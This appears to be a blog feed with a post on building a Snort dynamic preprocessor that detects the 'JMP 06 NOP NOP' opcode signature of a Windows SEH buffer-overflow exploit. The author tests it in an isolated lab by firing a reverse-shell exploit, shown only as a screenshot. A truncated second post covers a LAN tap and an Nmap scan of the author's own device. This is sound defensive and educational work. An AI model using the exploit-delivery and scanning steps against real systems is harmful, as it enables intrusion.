<p>A Snort preprocessor is a type of plugin which can be used to contribute additional processing functional to the core engine. Dynamic preprocessors are self contained libraries written in C which can be compiled independently of the main code base. The library is then included by placing it in a directory where Snort can find it at start-up, and updating the Snort configuration file so that Snort is aware of it.</p>
<h2>Shellcode Detection</h2>
<p>In a <a href="./../../../win7-seh-buffer-overflow-exploit/index.html">previous post</a>, I demonstrated a technique for exploiting a known vulnerability within a commercially available chat server application. The exploit involves delivering a payload containing reverse TCP shellcode which is then used to gain control over the compromised host.</p>
<p>The ultimate aim of this exercise is to develop a dynamic preprocessor which will be capable of detecting the pattern of data within a packet payload which indicates that a buffer overflow attack is in progress. I plan to do this in two parts:</p>
<p>The first part (this post) will describe the end-to-end process of putting together a template for the preprocessor, building it, checking that it gets loaded by Snort at runtime and then verifying that we can cause it to generate alerts by sending malicious traffic across the network segment it is monitoring, and checking that these alerts are then fowarded to an SIEM for analysis.</p>
<p>The second part (yet to be written at this point in time) will focus on the implementation detail of the main processing function within the preprocessor. The aim is devise an algorithm which can detect the tell-tale signs of a buffer overflow attack, without relying rigidly on the details of any specific vulnerability or known attack strategy. By understanding the general anatomy of a buffer overflow attack, I hope it will be possible to make informed judgements about the meaning of data values within the payload by looking at them within the context of the whole payload, rather than just determing their absence or presence, as a rule does.  The approach taken by Stig Andersson, Andrew Clark, and George Mohay in their research paper &#8220;<a href="https://www.researchgate.net/publication/27478341_Network_based_buffer_overflow_detection_by_exploit_code_analysis">Network based buffer overflow detection by exploit code analysis</a>&#8221; looks interesting and may provide some useful ideas.</p>
<p>It&#8217;s quite possible to achieve the functionality I&#8217;ve implemented here in Part 1 just using a rule; the reason I&#8217;ve split the development into two parts is partly because I&#8217;m doing this over a period of a few weeks and I&#8217;m using this blog as a kind of incremental work journal, and partly because I think this structure might of more use to people who just want to know how to get a template dynamic preprocessor project up and running but have some other purpose in mind for it.</p>
<h2>Test Lab</h2>
<p>The test lab was put together with the help of <a href="https://twitter.com/da_667">Tony Robinson&#8217;s</a> excellent book &#8220;<a href="https://www.goodreads.com/book/show/35406833-building-virtual-machine-labs">Building Virtual Machine Labs: A Hands-On Guide</a>&#8220;. The network architecture is divided into a number of segments using the virtual networking facilities provided by VirtualBox&#8217;s VMs.  This allows the guest VMs to be segregated logically according to their respective functions within the test lab. This approach enforces security by filtering traffic through a VM which acts as a firewall and a network gateway (pfSense). In this manner, traffic between the virtual and local physical networks, and traffic between the IPS (Snort) VM and the SIEM (Splunk) VM and the Snort management interface host, can be monitored and controlled separately.</p>
<p>In this setup, Snort is configured to be in-line between two network segments using a pair of virtual network adapters, rather than simply monitoring traffic passively. As well as allowing Snort to act as an IPS (ie by dropping packets) if required, a major advantage of this arrangement is that it allows one segment of the lab to be configured as a secure sandbox for examining malware if required. Shutting down the IPS VM will effectively isolate the segment containing the compromised host, which is a very useful &#8220;panic button&#8221; facility to have available, should things get out of control.</p>
<p><figure id="attachment_297" aria-describedby="caption-attachment-297" style="width: 980px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/pwnlab-nw-diag-2.png"><img loading="lazy" decoding="async" class="wp-image-297 size-large" src="./../../../wp-content/uploads/2017/08/pwnlab-nw-diag-2-1024x704.png" alt="" width="980" height="674" data-wp-pid="297" srcset="./../../../wp-content/uploads/2017/08/pwnlab-nw-diag-2-1024x704.png 1024w, ./../../../wp-content/uploads/2017/08/pwnlab-nw-diag-2-300x206.png 300w, ./../../../wp-content/uploads/2017/08/pwnlab-nw-diag-2-768x528.png 768w, ./../../../wp-content/uploads/2017/08/pwnlab-nw-diag-2-210x144.png 210w, ./../../../wp-content/uploads/2017/08/pwnlab-nw-diag-2.png 1076w" sizes="(max-width: 980px) 100vw, 980px" /></a><figcaption id="caption-attachment-297" class="wp-caption-text">Virtualised Lab Architecture</figcaption></figure></p>
<p>&nbsp;</p>
<p><figure id="attachment_263" aria-describedby="caption-attachment-263" style="width: 980px" class="wp-caption alignnone"><a href="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-30-54.png"><img loading="lazy" decoding="async" class="wp-image-263 size-large" src="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-30-54-1024x576.png" alt="" width="980" height="551" data-wp-pid="263" srcset="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-30-54-1024x576.png 1024w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-30-54-300x169.png 300w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-30-54-768x432.png 768w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-30-54-210x118.png 210w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-30-54.png 1366w" sizes="(max-width: 980px) 100vw, 980px" /></a><figcaption id="caption-attachment-263" class="wp-caption-text">Virtualised Test Lab &#8211; VirtualBox on CentOS 7</figcaption></figure></p>
<h2>DPX</h2>
<p>The nice people over at <a href="https://www.snort.org/">Snort headquarters</a> have made a example dynamic preprocessor  (<span style="text-decoration: underline;">D</span>ymanic <span style="text-decoration: underline;">P</span>reprocessor e<span style="text-decoration: underline;">X</span>ample) project available for <a href="https://www.snort.org/documents/38">download</a>. The project provides the source code for an &#8220;empty&#8221; plugin, build scripts which take care of bringing all the required elements together and distributing the ouput binaries to the correct locations, plus a unit test script (bundled with some test data in the form of a .pcap file) to verify that the resultant plugin behaves as it should &#8211; in isolation, at least.</p>
<p>Although this project is really helpful in providing a head-start, the business of getting the plugin configured, registered with and loaded by Snort at start-up and called during execution takes a little more work, and not all of the steps involved are entirely intuitive.  The remainder of this post explains how to get the preprocessor up and running in a test lab environment.</p>
<h2>Installation</h2>
<p>The steps involved in downloading, installing and building the example project as-is are listed <a href="https://www.snort.org/documents/38">here</a>. Note that the source development header files for Snort itself are also needed to allow the project to be built. These won&#8217;t be present in an existing Snort installation unless it was built from source and so need will need to be downloaded separately.</p>
<p><figure id="attachment_275" aria-describedby="caption-attachment-275" style="width: 810px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/build-log-2.png"><img loading="lazy" decoding="async" class="wp-image-275 size-full" src="./../../../wp-content/uploads/2017/08/build-log-2.png" alt="" width="810" height="744" data-wp-pid="275" srcset="./../../../wp-content/uploads/2017/08/build-log-2.png 810w, ./../../../wp-content/uploads/2017/08/build-log-2-300x276.png 300w, ./../../../wp-content/uploads/2017/08/build-log-2-768x705.png 768w, ./../../../wp-content/uploads/2017/08/build-log-2-210x193.png 210w" sizes="(max-width: 810px) 100vw, 810px" /></a><figcaption id="caption-attachment-275" class="wp-caption-text">Building the example dynamic preprocessor.</figcaption></figure></p>
<h2>Hello World</h2>
<p>As I mentioned previously, the aim in Part 1 of this post is just to add some simple functionality to the preprocessor and prove that it&#8217;s working, before moving on to more complex packet payload analysis functionality in Part 2. The following paragraphs describe what I did to acheive that objective.</p>
<h3>Source Code Changes</h3>
<p>Out of the box, the example preprocessor examines packets to determine whether the source or destination port number matches a pre-defined number. This number is defined in Snort configuration file, which needs to be modified to incude configuration values for the new preprocessor. I modified the source to allow the preprocessor to look for the presence of a sequence of hex values within the packet payload. This sequence represents the opcodes &#8220;JMP 06 NOP NOP&#8221; typically seen when an <a href="./../../../win7-seh-buffer-overflow-exploit/index.html">exploit which abuses Windows SEH</a> is deployed.</p>
<p><strong>/opt/snort_dpx/dpx-1.7/dpx.c</strong></p>
<p><figure id="attachment_251" aria-describedby="caption-attachment-251" style="width: 845px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/dpx-c.png"><img loading="lazy" decoding="async" class="wp-image-251 size-full" src="./../../../wp-content/uploads/2017/08/dpx-c.png" alt="" width="845" height="335" data-wp-pid="251" srcset="./../../../wp-content/uploads/2017/08/dpx-c.png 845w, ./../../../wp-content/uploads/2017/08/dpx-c-300x119.png 300w, ./../../../wp-content/uploads/2017/08/dpx-c-768x304.png 768w, ./../../../wp-content/uploads/2017/08/dpx-c-210x83.png 210w" sizes="(max-width: 845px) 100vw, 845px" /></a><figcaption id="caption-attachment-251" class="wp-caption-text">Addition of search string containing opcode hex values.</figcaption></figure></p>
<p><strong>/opt/snort_dpx/dpx-1.7/dpx.c</strong></p>
<p><figure id="attachment_250" aria-describedby="caption-attachment-250" style="width: 856px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/dpx-c-2.png"><img loading="lazy" decoding="async" class="wp-image-250 size-full" src="./../../../wp-content/uploads/2017/08/dpx-c-2.png" alt="" width="856" height="635" data-wp-pid="250" srcset="./../../../wp-content/uploads/2017/08/dpx-c-2.png 856w, ./../../../wp-content/uploads/2017/08/dpx-c-2-300x223.png 300w, ./../../../wp-content/uploads/2017/08/dpx-c-2-768x570.png 768w, ./../../../wp-content/uploads/2017/08/dpx-c-2-210x156.png 210w" sizes="(max-width: 856px) 100vw, 856px" /></a><figcaption id="caption-attachment-250" class="wp-caption-text">Addition of a simple substring search to main preprocessor method.</figcaption></figure></p>
<p>Notice the call to DynamicPreprocessorData.alertAdd(&#8230;), which causes an alert to be generated when the required conditions are met. This method takes seven parameters: the ID of the preprocessor, the ID of the rule, the rule revision number, the alert classication number, the alert pritority, a message string and a reference to metadata pertinent to the alert (none in this case). NB: The use of term &#8220;rule&#8221; is used here even though we&#8217;re not dealing with a rule object; I suspect this is because alerts are <em>normally</em> generated by Snort rules, and the terminolgy used within the source probably isn&#8217;t generic enough to deal with alerts generated from other sources.</p>
<h3>Configuration Changes</h3>
<p>The alert classification number used in the above method call is derived from the alert classification file which maps classfication types to alert messages:</p>
<p><strong>/opt/snort/etc/classification.conf</strong></p>
<p><a href="./../../../wp-content/uploads/2017/08/classification-config.png"><img loading="lazy" decoding="async" class="alignnone size-medium_large wp-image-249" src="./../../../wp-content/uploads/2017/08/classification-config-768x186.png" alt="" width="768" height="186" data-wp-pid="249" srcset="./../../../wp-content/uploads/2017/08/classification-config-768x186.png 768w, ./../../../wp-content/uploads/2017/08/classification-config-300x73.png 300w, ./../../../wp-content/uploads/2017/08/classification-config-210x51.png 210w, ./../../../wp-content/uploads/2017/08/classification-config.png 938w" sizes="(max-width: 768px) 100vw, 768px" /></a></p>
<p><strong>/opt/snort_dpx/dpx-1.7/dpx.c</strong></p>
<p><figure id="attachment_271" aria-describedby="caption-attachment-271" style="width: 845px" class="wp-caption alignnone"><a href="./../../../wp-content/uploads/2017/08/dpx-c-3.png"><img loading="lazy" decoding="async" class="wp-image-271 size-full" src="./../../../wp-content/uploads/2017/08/dpx-c-3.png" alt="" width="845" height="335" data-wp-pid="271" srcset="./../../../wp-content/uploads/2017/08/dpx-c-3.png 845w, ./../../../wp-content/uploads/2017/08/dpx-c-3-300x119.png 300w, ./../../../wp-content/uploads/2017/08/dpx-c-3-768x304.png 768w, ./../../../wp-content/uploads/2017/08/dpx-c-3-210x83.png 210w" sizes="(max-width: 845px) 100vw, 845px" /></a><figcaption id="caption-attachment-271" class="wp-caption-text">GID and SID definitions</figcaption></figure></p>
<p>Constants defined in the preprocessor info header file sf_preproc_info.h determine the major and and minor version numbers, plus the name of the preprocessor (the name string value is important, as it is used to identify configuration values with the snort.conf config file):</p>
<p><strong>/opt/snort_dpx/dpx-1.7/sf_preproc_info.h</strong></p>
<p><figure id="attachment_270" aria-describedby="caption-attachment-270" style="width: 537px" class="wp-caption alignnone"><a href="./../../../wp-content/uploads/2017/08/sf_preproc_info-2.png"><img loading="lazy" decoding="async" class="wp-image-270" src="./../../../wp-content/uploads/2017/08/sf_preproc_info-2.png" alt="" width="537" height="179" data-wp-pid="270" srcset="./../../../wp-content/uploads/2017/08/sf_preproc_info-2.png 660w, ./../../../wp-content/uploads/2017/08/sf_preproc_info-2-300x100.png 300w, ./../../../wp-content/uploads/2017/08/sf_preproc_info-2-210x70.png 210w" sizes="(max-width: 537px) 100vw, 537px" /></a><figcaption id="caption-attachment-270" class="wp-caption-text">Major/minor version numbers and preprocessor name definitions</figcaption></figure></p>
<p>Snort determines where to look for dynamic prepreocessors according to an entry in the snort.conf configuration file:</p>
<p><strong>/opt/snort/etc/snort.conf</strong></p>
<p><figure id="attachment_305" aria-describedby="caption-attachment-305" style="width: 980px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/snort-conf-1.png"><img loading="lazy" decoding="async" class="wp-image-305 size-large" src="./../../../wp-content/uploads/2017/08/snort-conf-1-1024x329.png" alt="" width="980" height="315" data-wp-pid="305" srcset="./../../../wp-content/uploads/2017/08/snort-conf-1-1024x329.png 1024w, ./../../../wp-content/uploads/2017/08/snort-conf-1-300x97.png 300w, ./../../../wp-content/uploads/2017/08/snort-conf-1-768x247.png 768w, ./../../../wp-content/uploads/2017/08/snort-conf-1-210x68.png 210w, ./../../../wp-content/uploads/2017/08/snort-conf-1.png 1147w" sizes="(max-width: 980px) 100vw, 980px" /></a><figcaption id="caption-attachment-305" class="wp-caption-text">&#8220;dynamicpreprocessor directory&#8221; entry in snort.conf</figcaption></figure></p>
<p>To ensure that the new preprocessor is loaded dynamically by Snort, either copy or symlink the libraries to the location specified in &#8220;dynamicpreprocessor directory&#8221; entry in the snort.conf configuration file:</p>
<p><figure id="attachment_262" aria-describedby="caption-attachment-262" style="width: 802px" class="wp-caption alignright"><a href="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-30-37.png"><img loading="lazy" decoding="async" class="wp-image-262 size-full" src="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-30-37.png" alt="" width="802" height="167" data-wp-pid="262" srcset="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-30-37.png 802w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-30-37-300x62.png 300w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-30-37-768x160.png 768w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-30-37-210x44.png 210w" sizes="(max-width: 802px) 100vw, 802px" /></a><figcaption id="caption-attachment-262" class="wp-caption-text">Libraries associated with the example dynamic preprocessor</figcaption></figure></p>
<p>Newer versions of Snort allows rules and events associated with preprocessors to be enabled and disabled individually via separate configuration file, however for the purposes of this exercise, we can just direct Snort to automatically enable all preprocessor rules with the following entry in the snort.conf configuration file:</p>
<p><strong>/opt/snort/etc/snort.conf</strong></p>
<p><a href="./../../../wp-content/uploads/2017/08/snort-conf-2.png"><img loading="lazy" decoding="async" class="size-large wp-image-306 aligncenter" src="./../../../wp-content/uploads/2017/08/snort-conf-2-1024x329.png" alt="" width="980" height="315" data-wp-pid="306" srcset="./../../../wp-content/uploads/2017/08/snort-conf-2-1024x329.png 1024w, ./../../../wp-content/uploads/2017/08/snort-conf-2-300x97.png 300w, ./../../../wp-content/uploads/2017/08/snort-conf-2-768x247.png 768w, ./../../../wp-content/uploads/2017/08/snort-conf-2-210x68.png 210w, ./../../../wp-content/uploads/2017/08/snort-conf-2.png 1147w" sizes="(max-width: 980px) 100vw, 980px" /></a></p>
<p>While we&#8217;re modifying snort.conf, let&#8217;s add an entry to configure the preprocessor&#8217;s behaviour at runtime. The following line defines the value a port number; the packet being processed must have either a source or destination port value which matches this value or the packet will be ignored by the preprocessor:</p>
<p><strong>/opt/snort/etc/snort.conf</strong></p>
<p><a href="./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.40.42.png"><img loading="lazy" decoding="async" class="alignnone size-medium_large wp-image-255" src="./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.40.42-768x241.png" alt="" width="768" height="241" data-wp-pid="255" srcset="./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.40.42-768x241.png 768w, ./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.40.42-300x94.png 300w, ./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.40.42-1024x321.png 1024w, ./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.40.42-210x66.png 210w, ./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.40.42.png 1083w" sizes="(max-width: 768px) 100vw, 768px" /></a></p>
<p>To make debugging a little easier, let&#8217;s also ensure that Snort generates a vebose human-readable alert text file, as well as the standard unified binary format alert file:</p>
<p><a href="./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.42.14.png"><img loading="lazy" decoding="async" class="alignnone size-medium_large wp-image-256" src="./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.42.14-768x252.png" alt="" width="768" height="252" data-wp-pid="256" srcset="./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.42.14-768x252.png 768w, ./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.42.14-300x99.png 300w, ./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.42.14-210x69.png 210w, ./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.42.14.png 810w" sizes="(max-width: 768px) 100vw, 768px" /></a></p>
<p>The last step is to map the preprocessor GID and SID values to human-readable message strings which will be included in the generated alerts &#8211; this is achieved by adding entries to the gen-msg.map file:</p>
<p><strong>/opt/snort/etc/gen-msg.map</strong></p>
<p><a href="./../../../wp-content/uploads/2017/08/gen-msg-map.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-252" src="./../../../wp-content/uploads/2017/08/gen-msg-map.png" alt="" width="949" height="166" data-wp-pid="252" srcset="./../../../wp-content/uploads/2017/08/gen-msg-map.png 949w, ./../../../wp-content/uploads/2017/08/gen-msg-map-300x52.png 300w, ./../../../wp-content/uploads/2017/08/gen-msg-map-768x134.png 768w, ./../../../wp-content/uploads/2017/08/gen-msg-map-210x37.png 210w" sizes="(max-width: 949px) 100vw, 949px" /></a></p>
<h2>Testing</h2>
<p>Having made the required source code and config file changes, we can now rebuild the preprocessor and then restart Snort:</p>
<p><a href="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-25-59.png"><img loading="lazy" decoding="async" class="alignnone size-medium_large wp-image-261" src="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-25-59-768x173.png" alt="" width="768" height="173" data-wp-pid="261" srcset="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-25-59-768x173.png 768w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-25-59-300x68.png 300w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-25-59-210x47.png 210w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-25-59.png 797w" sizes="(max-width: 768px) 100vw, 768px" /></a></p>
<p>Examining the syslog log file, we can see that Snort appears to have loaded without errors:</p>
<p><strong>/var/log/syslog</strong></p>
<p><a href="./../../../wp-content/uploads/2017/08/syslog-1.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-281" src="./../../../wp-content/uploads/2017/08/syslog-1.png" alt="" width="825" height="309" data-wp-pid="281" srcset="./../../../wp-content/uploads/2017/08/syslog-1.png 825w, ./../../../wp-content/uploads/2017/08/syslog-1-300x112.png 300w, ./../../../wp-content/uploads/2017/08/syslog-1-768x288.png 768w, ./../../../wp-content/uploads/2017/08/syslog-1-210x79.png 210w" sizes="(max-width: 825px) 100vw, 825px" /></a></p>
<p>&#8230;and has loaded the new dynamic preprocessor:</p>
<p><a href="./../../../wp-content/uploads/2017/08/syslog-2-2.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-283" src="./../../../wp-content/uploads/2017/08/syslog-2-2.png" alt="" width="850" height="342" data-wp-pid="283" srcset="./../../../wp-content/uploads/2017/08/syslog-2-2.png 850w, ./../../../wp-content/uploads/2017/08/syslog-2-2-300x121.png 300w, ./../../../wp-content/uploads/2017/08/syslog-2-2-768x309.png 768w, ./../../../wp-content/uploads/2017/08/syslog-2-2-210x84.png 210w" sizes="(max-width: 850px) 100vw, 850px" /></a></p>
<h3>Exploit</h3>
<p>To test the functionality of the preprocessor, we launch an attack against the target host whose payload contains the shellcode for a Windows SEH exploit:</p>
<h2><a href="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-08-13-45-44.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-285" src="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-08-13-45-44.png" alt="" width="850" height="360" data-wp-pid="285" srcset="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-08-13-45-44.png 850w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-08-13-45-44-300x127.png 300w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-08-13-45-44-768x325.png 768w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-08-13-45-44-210x89.png 210w" sizes="(max-width: 850px) 100vw, 850px" /></a></h2>
<h3>Detection and Alerting</h3>
<p>By examining the Snort alert log file, we can see that the preprocessor has detected the SEH exploit opcode hex values and has generated an alert:</p>
<p><strong>/var/log/snort/sjd_alert.full</strong></p>
<p><a href="./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.47.26.png"><img loading="lazy" decoding="async" class="alignnone size-medium_large wp-image-258" src="./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.47.26-768x289.png" alt="" width="768" height="289" data-wp-pid="258" srcset="./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.47.26-768x289.png 768w, ./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.47.26-300x113.png 300w, ./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.47.26-210x79.png 210w, ./../../../wp-content/uploads/2017/08/Item-0-SnappyApp-Today-at-19.47.26.png 956w" sizes="(max-width: 768px) 100vw, 768px" /></a></p>
<h3>SIEM</h3>
<p>The last step in the verifcation process is to check that the Splunk universal forwarder correctly parses the alert and forwards the details as JSON formatted data to the Splunk SIEM for analysis. By issuing a simple search for the string &#8220;DPX&#8221; in the Splunk reporting interface, we can see that the alert has been received by the SIEM:</p>
<p><figure id="attachment_260" aria-describedby="caption-attachment-260" style="width: 768px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-20-58.png"><img loading="lazy" decoding="async" class="wp-image-260 size-medium_large" src="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-20-58-768x432.png" alt="" width="768" height="432" data-wp-pid="260" srcset="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-20-58-768x432.png 768w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-20-58-300x169.png 300w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-20-58-1024x576.png 1024w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-20-58-210x118.png 210w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-20-58.png 1366w" sizes="(max-width: 768px) 100vw, 768px" /></a><figcaption id="caption-attachment-260" class="wp-caption-text">Preprocessor alert ingested by Splunk SIEM</figcaption></figure></p>
<p>Expanding the alert JSON data shows that the alert contains the data we expect in each field:</p>
<p><figure id="attachment_259" aria-describedby="caption-attachment-259" style="width: 768px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-17-30.png"><img loading="lazy" decoding="async" class="wp-image-259 size-medium_large" src="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-17-30-768x432.png" alt="" width="768" height="432" data-wp-pid="259" srcset="./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-17-30-768x432.png 768w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-17-30-300x169.png 300w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-17-30-1024x576.png 1024w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-17-30-210x118.png 210w, ./../../../wp-content/uploads/2017/08/Screenshot-from-2017-08-07-18-17-30.png 1366w" sizes="(max-width: 768px) 100vw, 768px" /></a><figcaption id="caption-attachment-259" class="wp-caption-text">Splunk SIEM displaying preprocessor alert detail</figcaption></figure></p>
<h2>Conclusions</h2>
<p>Getting the example dynamic preprocessor example up and running took quite a bit of detective work and trial and error, but given the amount of extra processing scope and flexibility that preprocessors provide, over and above that provided by rules alone, I believe the investment in time and effort will prove to be worthwhile.</p>
<p>Hopefully the information presented here will be of help to anyone in a similar position. It&#8217;s worth noting that the post archives over at <a href="http://seclists.org/snort/">seclists.org</a> are great source of information, as were some of the papers at the <a href="https://uk.sans.org/reading-room/whitepapers/tools/">SANS UK Reading Room</a> site.</p>
<p>In Part 2 of this post, I&#8217;ll be tackling the business of implementing the main processing method within the preprocessor, which will require devising an algorithm which can detect the tell-tale signs of a buffer overflow attack, without relying rigidly on the details of any specific vulnerability or known attack strategy.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Throwing Star LAN Tap</title>
		<link>./../../../throwing-star-lan-tap/index.html</link>
		
		<dc:creator><![CDATA[spen440]]></dc:creator>
		<pubDate>Wed, 02 Aug 2017 17:50:05 +0000</pubDate>
				<category><![CDATA[Network Reconnaissance]]></category>
		<category><![CDATA[Ethernet]]></category>
		<category><![CDATA[Network]]></category>
		<category><![CDATA[Packet Capture]]></category>
		<category><![CDATA[Wireshark]]></category>
		<guid isPermaLink="false">./../../../index.html?p=209</guid>

					<description><![CDATA[Just recently I decided to add a passive LAN tap to my toolkit, partly because I needed a quick, easy and non-intrusive way of being able to monitor network traffic, and partly to justify buying a new soldering iron. The kit was manufactured by Great Scott Gadgets to Michael Ossman&#8217;s original design and supplied by RoboSavvy. [&#8230;]]]></description>
										<content:encoded><![CDATA[<h2></h2>
<p>Just recently I decided to add a passive LAN tap to my toolkit, partly because I needed a quick, easy and non-intrusive way of being able to monitor network traffic, and partly to justify buying a new soldering iron.</p>
<p><span id="more-209"></span></p>
<p>The kit was manufactured by <a href="https://greatscottgadgets.com/">Great Scott Gadgets</a> to <a href="http://ossmann.blogspot.co.uk/2011/02/throwing-star-lan-tap.html">Michael Ossman&#8217;s</a> original design and supplied by <a href="https://robosavvy.com/web/">RoboSavvy</a>. It&#8217;s been a while since I tackled anything involving a PCB and molten metal, but the lack of dry and/or bridged joints must mean I haven&#8217;t completely lost the ability to solder just yet.</p>
<p><figure id="attachment_212" aria-describedby="caption-attachment-212" style="width: 376px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/08/t-star-lan-tap.jpeg"><img loading="lazy" decoding="async" class="wp-image-212" src="./../../../wp-content/uploads/2017/08/t-star-lan-tap-300x232.jpeg" alt="" width="376" height="291" data-wp-pid="212" srcset="./../../../wp-content/uploads/2017/08/t-star-lan-tap-300x232.jpeg 300w, ./../../../wp-content/uploads/2017/08/t-star-lan-tap-210x163.jpeg 210w, ./../../../wp-content/uploads/2017/08/t-star-lan-tap.jpeg 431w" sizes="(max-width: 376px) 100vw, 376px" /></a><figcaption id="caption-attachment-212" class="wp-caption-text">Kit contents</figcaption></figure></p>
<p><figure id="attachment_26" aria-describedby="caption-attachment-26" style="width: 376px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/05/WP_20170518_17_46_44_Pro-e1495127160427.jpg"><img loading="lazy" decoding="async" class="wp-image-26" src="./../../../wp-content/uploads/2017/05/WP_20170518_17_46_44_Pro-e1495127160427-240x300.jpg" alt="" width="376" height="470" data-wp-pid="26" srcset="./../../../wp-content/uploads/2017/05/WP_20170518_17_46_44_Pro-e1495127160427-240x300.jpg 240w, ./../../../wp-content/uploads/2017/05/WP_20170518_17_46_44_Pro-e1495127160427-820x1024.jpg 820w, ./../../../wp-content/uploads/2017/05/WP_20170518_17_46_44_Pro-e1495127160427-768x959.jpg 768w, ./../../../wp-content/uploads/2017/05/WP_20170518_17_46_44_Pro-e1495127160427-168x210.jpg 168w, ./../../../wp-content/uploads/2017/05/WP_20170518_17_46_44_Pro-e1495127160427.jpg 841w" sizes="(max-width: 376px) 100vw, 376px" /></a><figcaption id="caption-attachment-26" class="wp-caption-text">Fully assembled</figcaption></figure></p>
<p>There are four RJ-45 ports &#8211; two for connecting in-line on the Ethernet network to be monitored, and two monitoring ports. As an unpowered tap, it doesn&#8217;t have the ability to cope with full duplex Gigabit Ethernet, so only two of transmit/receive pairs are broken out to monitor ports. This also means that the monitoring ports are unidirectional; to sniff traffic in both directions at the same time you&#8217;d need to connect both monitoring ports, for example using a dual port NIC.</p>
<p>The on board capacitors are there to act as low-pass filters, forcing the network devices at either end of the network segment being monitored to fall back to 100BASE-T, allowing Gigabit traffic 1000BASE-T to at least be monitored, albeit over a link downgraded to Fast Ethernet (of course, if you only ever want to sniff 100BASE-T traffic, none of that matters anyway).</p>
<p>As a quick test just to prove things work as expected, I inserted the tap between my Mac and a switch on my home network, then kicked off an aggressive Nmap scan against my wife&#8217;s poor unsuspecting Roberts &#8220;smart&#8221; radio. Running Wireshark on a laptop connected to the upstream monitoring port, we can see the scan activity being directed at the target device; the capture in the screenshot shows an attempt by Nmap to locate signs of unprotected Git repositories at the root of the web admin interface, by using the http-gti.nse script as part of the aggressive scan:</p>
